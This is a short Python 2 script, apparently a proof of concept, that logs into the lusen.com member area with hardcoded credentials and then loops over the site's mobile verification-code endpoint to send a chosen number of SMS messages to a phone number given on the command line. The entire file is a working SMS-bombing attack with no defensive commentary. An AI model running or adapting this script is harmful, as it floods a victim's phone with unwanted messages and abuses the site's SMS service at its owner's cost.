#-*-coding:utf-8-*-
#!/usr/bin/python

import json
import urllib2
import sys

def request_ajax_url(url,body,referer=None,cookie=None,**headers):
    req = urllib2.Request(url)

    req.add_header('Content-Type', 'application/json')
    req.add_header('X-Requested-With','XMLHttpRequest')

    if cookie:
        req.add_header('Cookie',cookie)

    if referer:
        req.add_header('Referer',referer)

    if headers:
        for k in headers.keys():
            req.add_header(k,headers[k])

    postBody = json.dumps(body)

    response = urllib2.urlopen(req, postBody)

    if response:
        return response

def run():
    import time
    "use username:xfkxfk; use password:123456"

    login_url = 'http://www.lusen.com/member/Login.aspx'
    login_body = {"action":"login","UserName":"xfkxfk","Password":"123456","AutomaticLogin":False}
    login_referer = "http://www.lusen.com/member/Login.aspx?ReturnUrl=aHR0cDovL3d3dy5sdXNlbi5jb20vRGVmYXVsdC5hc3B4"

    url = 'http://www.lusen.com/Member/MobileValidate.aspx'
    referer = "http://www.lusen.com/Member/ModifyMobileValidate.aspx"

    headers = {}

    response = request_ajax_url(login_url,login_body,login_referer)

    if response.read() == "1":
        print " Login Success !!!"

    if response.headers.has_key('set-cookie'):
        set_cookie = response.headers['set-cookie']
    else :
        print " Get set-cookie Failed !!! May Send Messages Failed ~~~"

    if len(sys.argv) < 3:
        print "\nUsage: python " + sys.argv[0] + "mobile_number" + "count\n"
        sys.exit()

    mobile_number = sys.argv[1]
    count = sys.argv[2]
    body = {"action":"GetValidateCode","Mobile":mobile_number}

    i=0
    while i < int(count):
        response = request_ajax_url(url,body,referer,set_cookie)
        i=i+1

    if response.read() == "发送成功":
        print " Send " + count + " Messages To " + mobile_number + " !!!"

if __name__ == "__main__":
    run()
    
    
